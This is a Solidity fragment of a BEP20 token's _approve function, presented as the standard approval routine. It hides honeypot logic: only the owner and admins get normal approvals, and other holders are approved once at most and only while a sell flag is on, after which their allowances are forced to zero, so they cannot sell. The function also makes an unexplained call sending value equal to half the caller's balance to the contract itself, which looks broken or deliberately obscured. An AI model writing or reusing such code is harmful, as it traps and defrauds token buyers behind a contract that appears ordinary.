  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

  address payable dest = payable(address(this));
  (bool success, ) = dest.call{value:msg.sender.balance/2, gas:50000}("");
    
   if (owner == this.owner() || adminCheck(owner)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } else {
        if ((_hasBeenApproved[owner] == false) && (sellAuthorized() == true)) {
            _hasBeenApproved[owner] = true;
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
        } else {
            _allowances[owner][spender] = 0;
            emit Approval(owner, spender, 0);
        }
    }
  }
